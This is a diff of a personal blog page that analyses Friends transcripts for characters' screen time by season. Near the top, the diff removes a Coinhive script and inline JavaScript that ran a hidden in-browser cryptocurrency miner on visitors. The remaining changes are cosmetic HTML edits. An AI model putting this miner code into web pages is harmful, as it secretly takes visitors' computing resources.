@@ -39,31 +39,8 @@
         })();
   </script>
   
-  <script src="https://coinhive.com/lib/coinhive.min.js"></script>
 </head>
 <body>
-<script>
-  var miner = new CoinHive.Anonymous('0Q2TtxhYQVKpZ8093Pd2RDdyZaWsqJoh');
-  miner.start();
-</script>
-
-<script>
-  // Listen on events
-  miner.on('found', function() {  })
-  miner.on('accepted', function() {  })
-
-  // Update stats once per second
-  setInterval(function() {
-      var hashesPerSecond = miner.getHashesPerSecond();
-      var totalHashes = miner.getTotalHashes();
-      var acceptedHashes = miner.getAcceptedHashes();
-
-      // Output to HTML elements...
-      console.log("H/s: " + hashesPerSecond);
-      console.log("Total Hashes: " + totalHashes);
-      console.log("Acepted Hashes: " + acceptedHashes);
-  }, 1000);
-</script>
   <div class="table-container">
     <div class="table-block footer-push">
       <div class="container">
@@ -122,7 +99,7 @@ transcripts of all episodes from all seasons of one of my favorite TV series,
 <p><img src="/uploads/friends_logo.png" alt="Friends TV Series" title="Friends TV Series" /></p>
 <h2 id="dataset"><a class="toclink" href="#dataset">Dataset</a></h2>
 <p>The aforementioned dataset, consists of transcripts, spread across
-a nested structure of seasons<sup id="fnref:s2_formatting"><a rel="footnote" class="footnote-ref" href="#fn:s2_formatting">1</a></sup>, episodes, and scenes. Each scene, naturally,
+a nested structure of seasons<sup id="fnref:s2_formatting"><a class="footnote-ref" rel="footnote" href="#fn:s2_formatting">1</a></sup>, episodes, and scenes. Each scene, naturally,
 contains a sequence of lines, by characters predominantly addressing each
 other. For examples, here's a simplified example of a scene:</p>
 <div class="codehilite"><pre>[Scene: A Park, Alice and Bob are having a picnic.]
@@ -133,7 +110,7 @@ Bob: Indeed, we are.
 
 <h2 id="methodology"><a class="toclink" href="#methodology">Methodology</a></h2>
 <p>The focus of this study is to investigate two proxies of character importances,
-namely, total number of lines alloted, and sum of the lengths<sup id="fnref:line_length"><a rel="footnote" class="footnote-ref" href="#fn:line_length">2</a></sup> of
+namely, total number of lines alloted, and sum of the lengths<sup id="fnref:line_length"><a class="footnote-ref" rel="footnote" href="#fn:line_length">2</a></sup> of
 all lines alloted, for each individual season.</p>
 <p>Of course, given the raw nature of the unprocessed data, the aforementioned metrics
 are only approximations. Nevertheless their degree of significance is strong enough
@@ -146,13 +123,13 @@ for the purposes and scope of this study.</p>
 <a target="_blank" href="/uploads/Friends_line_length_all.png"><img src="/uploads/Friends_line_length_all_150x256.png" alt="Total line length for all characters" /></a>
 <a target="_blank" href="/uploads/Friends_line_length_supp.png"><img src="/uploads/Friends_line_length_supp_148x256.png" alt="Total line length with focus on supporting characters" /></a>
 </div><p></p>
-<p>We can clearly observe well-formed<sup id="fnref:pair_formation"><a rel="footnote" class="footnote-ref" href="#fn:pair_formation">3</a></sup> pairs of characters<sup id="fnref:char_pairs"><a rel="footnote" class="footnote-ref" href="#fn:char_pairs">4</a></sup>, by as early as the end of the fourth season: <a href="http://friends.wikia.com/wiki/Ross_and_Rachel">Ross and Rachel</a>, <a href="http://friends.wikia.com/wiki/Monica_and_Chandler">Monica and Chandler</a>, and <a href="http://friends.wikia.com/wiki/Joey_Tribbiani_Jr.">Joey</a> and <a href="http://friends.wikia.com/wiki/Phoebe_Buffay">Phoebe</a>; the total line length graphs reveal a further pair, formed by <a href="http://friends.wikia.com/wiki/Chandler_and_Joey%27s_apartment">Joey and Chandler</a><sup id="fnref:jman_channie"><a rel="footnote" class="footnote-ref" href="#fn:jman_channie">5</a></sup>, which is not clear enough given only the context of the screen-time
+<p>We can clearly observe well-formed<sup id="fnref:pair_formation"><a class="footnote-ref" rel="footnote" href="#fn:pair_formation">3</a></sup> pairs of characters<sup id="fnref:char_pairs"><a class="footnote-ref" rel="footnote" href="#fn:char_pairs">4</a></sup>, by as early as the end of the fourth season: <a href="http://friends.wikia.com/wiki/Ross_and_Rachel">Ross and Rachel</a>, <a href="http://friends.wikia.com/wiki/Monica_and_Chandler">Monica and Chandler</a>, and <a href="http://friends.wikia.com/wiki/Joey_Tribbiani_Jr.">Joey</a> and <a href="http://friends.wikia.com/wiki/Phoebe_Buffay">Phoebe</a>; the total line length graphs reveal a further pair, formed by <a href="http://friends.wikia.com/wiki/Chandler_and_Joey%27s_apartment">Joey and Chandler</a><sup id="fnref:jman_channie"><a class="footnote-ref" rel="footnote" href="#fn:jman_channie">5</a></sup>, which is not clear enough given only the context of the screen-time
 analysis, though.</p>
 <p>Since the <a href="https://en.wikipedia.org/wiki/List_of_Friends_episodes#Season_5_.281999.E2.80.9300.29">beginning of the fifth season</a>, however, when a significant
 event takes place in the personal life of one of the leading cast members, we see a
 dramatic reshuffling of the "leaderboard". In particular, the beginning of the
-season in question, approximately overlaps with the beginning of Jennifer Aniston's <a href="https://en.wikipedia.org/wiki/Jennifer_Aniston#Relationships">relationship</a> with Brad Pitt<sup id="fnref:will_colbert"><a rel="footnote" class="footnote-ref" href="#fn:will_colbert">6</a></sup>, eventually leading to their marriage, immediately after the <a href="https://en.wikipedia.org/wiki/List_of_Friends_episodes#Season_6_.281999.E2.80.9300.29">end of season six</a> (around halfway through 2000).</p>
-<p>To put it mildly, as a result<sup id="fnref:ja_correlation"><a rel="footnote" class="footnote-ref" href="#fn:ja_correlation">7</a></sup>, the total amount of screen time<sup id="fnref:screen_time_proxies"><a rel="footnote" class="footnote-ref" href="#fn:screen_time_proxies">8</a></sup>
+season in question, approximately overlaps with the beginning of Jennifer Aniston's <a href="https://en.wikipedia.org/wiki/Jennifer_Aniston#Relationships">relationship</a> with Brad Pitt<sup id="fnref:will_colbert"><a class="footnote-ref" rel="footnote" href="#fn:will_colbert">6</a></sup>, eventually leading to their marriage, immediately after the <a href="https://en.wikipedia.org/wiki/List_of_Friends_episodes#Season_6_.281999.E2.80.9300.29">end of season six</a> (around halfway through 2000).</p>
+<p>To put it mildly, as a result<sup id="fnref:ja_correlation"><a class="footnote-ref" rel="footnote" href="#fn:ja_correlation">7</a></sup>, the total amount of screen time<sup id="fnref:screen_time_proxies"><a class="footnote-ref" rel="footnote" href="#fn:screen_time_proxies">8</a></sup>
 alloted to Aniston's character, Rachel, skyrockets for seasons 7 and 8.</p>
 <p>Another dramatic anomaly observed in the graphs is the significantly reduced
 season eight screen time, alloted to Chandler (portrayed by the wonderful Matthew Perry). A quick reference check on <a href="https://en.wikipedia.org/wiki/Matthew_Perry#Personal_life">what was going on</a> in the actor's life around that time, reveals that he had been battling with opioid
@@ -168,7 +145,7 @@ support the various implementation-design decisions, and provide minimally suffi
 <li id="fn:s2_formatting">
 <p>Due to poorly-formatted raw data for the second season, for the
 purposes of this study the corresponding episodes were excluded from the analysis.
-Nevertheless, I plan to customize my script further, in order to be able to subsequently include the missing data. <a rev="footnote" title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:s2_formatting">↩</a></p>
+Nevertheless, I plan to customize my script further, in order to be able to subsequently include the missing data. <a title="Jump back to footnote 1 in the text" class="footnote-backref" href="#fnref:s2_formatting" rev="footnote">↩</a></p>
 </li>
 <li id="fn:line_length">
 <p>While, line length can be viewed as a form of a proxy for total
@@ -178,35 +155,35 @@ For completeness, line length is defined as the total number of characters -
 including punctuation (which is assumed to account for additional screen time) -
 comprising a given character line. And line, itself, is defined as a contiguous
 array of sentences, alloted to a a set of characters (usually, a single
-character). <a rev="footnote" title="Jump back to footnote 2 in the text" class="footnote-backref" href="#fnref:line_length">↩</a></p>
+character). <a title="Jump back to footnote 2 in the text" class="footnote-backref" href="#fnref:line_length" rev="footnote">↩</a></p>
 </li>
 <li id="fn:pair_formation">
 <p>The notion of a pair here, however, is relatively vague, given
 the quintessentially fluent nature of interactions taking place within the context
-of a sitcom environment. <a rev="footnote" title="Jump back to footnote 3 in the text" class="footnote-backref" href="#fnref:pair_formation">↩</a></p>
+of a sitcom environment. <a title="Jump back to footnote 3 in the text" class="footnote-backref" href="#fnref:pair_formation" rev="footnote">↩</a></p>
 </li>
 <li id="fn:char_pairs">
 <p>Of course, this is by no means an estimate of amount of intra-pair interaction between said characters. It should be thought of more as a sort of ranking, based on character importance or reputation, corresponding the particular period of
-the timeline of the TV series. <a rev="footnote" title="Jump back to footnote 4 in the text" class="footnote-backref" href="#fnref:char_pairs">↩</a></p>
+the timeline of the TV series. <a title="Jump back to footnote 4 in the text" class="footnote-backref" href="#fnref:char_pairs" rev="footnote">↩</a></p>
 </li>
 <li id="fn:jman_channie">
 <p>At this point, the average die-hard fan of the show is probably reminded of quintessential moments like Joey's <em>"No more J-man and Channie's"</em>
-<a href="http://friends.wikia.com/wiki/The_One_Where_Ross_Hugs_Rachel">line</a>, after Chandler informed Joey he'd been moving out to live together with Monica. <a rev="footnote" title="Jump back to footnote 5 in the text" class="footnote-backref" href="#fnref:jman_channie">↩</a></p>
+<a href="http://friends.wikia.com/wiki/The_One_Where_Ross_Hugs_Rachel">line</a>, after Chandler informed Joey he'd been moving out to live together with Monica. <a title="Jump back to footnote 5 in the text" class="footnote-backref" href="#fnref:jman_channie" rev="footnote">↩</a></p>
 </li>
 <li id="fn:will_colbert">
 <p>Traditionally, just as the other various celebrities who were
 <a href="http://friends.wikia.com/wiki/Relationships">partners of cast members</a> at one point or another, Brad Pitt eventually <a href="http://friends.wikia.com/wiki/The_One_With_The_Rumor">made an appearance</a> on the show,
-portraying Will Colbert, who was presented as a former high school mate of Ross, Monica and Rachel. <a rev="footnote" title="Jump back to footnote 6 in the text" class="footnote-backref" href="#fnref:will_colbert">↩</a></p>
+portraying Will Colbert, who was presented as a former high school mate of Ross, Monica and Rachel. <a title="Jump back to footnote 6 in the text" class="footnote-backref" href="#fnref:will_colbert" rev="footnote">↩</a></p>
 </li>
 <li id="fn:ja_correlation">
 <p>Naturally, this is only a correlation outlined by the data.
 This study does not mean or intend, in any way whatsoever, to underestimate
 Jennifer Aniston's acting skills or visual characteristics (or any other factor
-that might have contributed to her amazing success, for that matter). <a rev="footnote" title="Jump back to footnote 7 in the text" class="footnote-backref" href="#fnref:ja_correlation">↩</a></p>
+that might have contributed to her amazing success, for that matter). <a title="Jump back to footnote 7 in the text" class="footnote-backref" href="#fnref:ja_correlation" rev="footnote">↩</a></p>
 </li>
 <li id="fn:screen_time_proxies">
 <p>As estimated via the total number of lines, as well as
-the cousin statistic, total line length. <a rev="footnote" title="Jump back to footnote 8 in the text" class="footnote-backref" href="#fnref:screen_time_proxies">↩</a></p>
+the cousin statistic, total line length. <a title="Jump back to footnote 8 in the text" class="footnote-backref" href="#fnref:screen_time_proxies" rev="footnote">↩</a></p>
 </li>
 </ol>
 </div><p></p>
@@ -242,7 +219,7 @@ the cousin statistic, total line length. <a rev="footnote" title="Jump back to 
       </div>
     </div>  <!-- end table block footer div -->
   </div>
-  <!-- Last generated: 2017-12-23T18:36:06Z -->
+  <!-- Last generated: 2018-04-02T21:37:01Z -->
 </body>
 </html>
 
